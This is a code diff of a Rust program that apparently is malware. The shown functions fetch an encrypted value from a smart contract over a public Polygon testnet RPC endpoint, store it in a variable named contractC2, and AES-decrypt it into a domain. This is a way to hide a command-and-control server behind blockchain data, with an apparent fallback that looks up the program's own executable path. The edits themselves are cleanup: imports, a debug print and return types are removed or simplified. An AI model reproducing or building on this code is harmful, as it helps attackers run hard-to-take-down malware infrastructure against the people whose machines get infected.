@@ -25,10 +25,6 @@ type Aes128ECfb = Cfb<Aes128, Pkcs7>;
 static Hash: &str = "UNIQUEHASH";
 static ContractKey: &str = "SMARTCONTRACTKEY";
 static TestnetRPC: &str = "https://endpoints.omniatech.io/v1/matic/mumbai/public";
-use web3::{
-    ethabi::ethereum_types::U256,
-    types::{Address, TransactionParameters, H160},
-};
 
 use fancy_regex::Regex; 
 
@@ -354,6 +350,7 @@ fn handleCertificate(domain: &str) -> Result<()>{
 
 use serde_json::Value;
 use rustc_serialize::json::{Json, ToJson};
+
 async fn handleContractKeccak(contractAddress: &str) -> String{
     // call RPC and interact with smart contract variable name (keccak)
 
@@ -378,7 +375,6 @@ async fn handleContractKeccak(contractAddress: &str) -> String{
     match json_object.find("result") {
         Some(field) => {
             let name = field.as_string().unwrap();
-            println!("O valor do campo 'name' é: {}", &name);
             let testing = hex::decode(&name[2..]).unwrap();
             let testStr = str::from_utf8(&testing).unwrap().replace(",","");
             let testStr = &testStr.trim_matches('\x00')[32..];
@@ -389,10 +385,6 @@ async fn handleContractKeccak(contractAddress: &str) -> String{
             "".to_string()
         }
     }
-
-
-    // let valueJson = jsonResponse["result"].as_str().unwrap()[2..];
-
 }
 
 use std::fs;
@@ -401,7 +393,7 @@ use std::ptr;
 use libc::{mprotect, PROT_NONE, PROT_READ};
 
 #[tokio::main]
-async fn rpcInteract(addr: &str) -> web3::Result<(web3::Result<()>, String)>{
+async fn rpcInteract(addr: &str) -> Result<((()), String)>{
     let contractC2 = handleContractKeccak(addr).await;
     if contractC2 == ""{
         let path = std::env::current_exe().unwrap();
@@ -450,7 +442,7 @@ async fn rpcInteract(addr: &str) -> web3::Result<(web3::Result<()>, String)>{
     let decrypted_ciphertext = cipher.decrypt(&mut buf).unwrap();
 
     let domain = String::from_utf8_lossy(decrypted_ciphertext);
-    Ok((Ok(()), domain.to_string()))
+    Ok(((()), domain.to_string()))
 }
 
 fn main() -> std::io::Result<()> {
